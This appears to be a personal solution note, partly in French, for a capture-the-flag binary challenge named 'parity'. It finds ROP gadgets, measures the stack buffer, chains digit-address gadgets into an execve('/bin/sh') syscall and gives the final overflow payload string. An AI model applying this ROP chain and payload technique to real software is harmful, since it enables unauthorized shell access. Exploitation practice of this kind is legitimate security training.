1)____________________________________________________________________________________________________________________________________

REPERER LES GADGETS:

$ objdump -d parity | grep -A 1 pop | grep -B 3 ret

    80486d3:	5d                   	pop    %ebp
    80486d4:	c3                   	ret    
    --
    8048736:	5e                   	pop    %esi
    8048737:	5f                   	pop    %edi
    8048738:	5d                   	pop    %ebp
    8048739:	c3                   	ret 

TAILLE DU BUFFER:       

   │0x80485dc <ispar>       push   %ebp                                                                                                                                                 │
   │0x80485dd <ispar+1>     mov    %esp,%ebp                                                                                                                                            │
   │0x80485df <ispar+3>     sub    $0x68,%esp         ---->  toDec: 104

LE PROGRAMME SEGFAULT LORSQUE L'INPUT > 75 CHAR

echo $(perl -e 'print "1"x(108)')

-> to overwrite eip a la fin de ispar, 
        il ne manque plus que de remplir les gadgets entre 0x30<0x39

2)____________________________________________________________________________________________________________________________________

3030302c:	01 00                	add    %eax,(%eax)
3030302e:	02 00                	add    (%eax),%al
30303030:	c7 00 00 00 00 00    	movl   $0x0,(%eax)
30303036:	c3                   	ret    

30303037:	40                   	inc    %eax
30303038:	c3                   	ret    

30303130:	31 c0                	xor    %eax,%eax
30303132:	c3                   	ret    

30303133:	83 e8 04             	sub    $0x4,%eax
30303136:	c3                   	ret    

30303230:	89 c1                	mov    %eax,%ecx
30303232:	c3                   	ret    

30303233:	89 c2                	mov    %eax,%edx
30303235:	c3                   	ret    

30303236:	89 c3                	mov    %eax,%ebx
30303238:	c3                   	ret    

30303330:	58                   	pop    %eax
30303331:	c3                   	ret    

30303332:	89 18                	mov    %ebx,(%eax)
30303334:	c3                   	ret    

30303335:	cd 80                	int    $0x80


34323434 <sh>:
34323434:	2f                   	das    
34323435:	62 69 6e             	bound  %ebp,0x6e(%ecx)

34323438 <bin>:
34323438:	2f                   	das    
34323439:	73 68                	jae    343234a3 <_end+0x63>


3)____________________________________________________________________________________________________________________________________

xor    %eax,%eax
pop    %eax
0x34323434           -> 'BIN/SH'
mov    %eax,%ebx       
xor    %eax,%eax
mov    %eax,%ecx    
mov    %eax,%edx  

inc    %eax    (x11)

int    $0x80

_________________________________________________________




4)____________________________________________________________________________________________________________________________________

111111111111111111111111111111111111111111111111111111111111111111111111111111110100030044246200010002003200700070007000700070007000700070007000700070005300

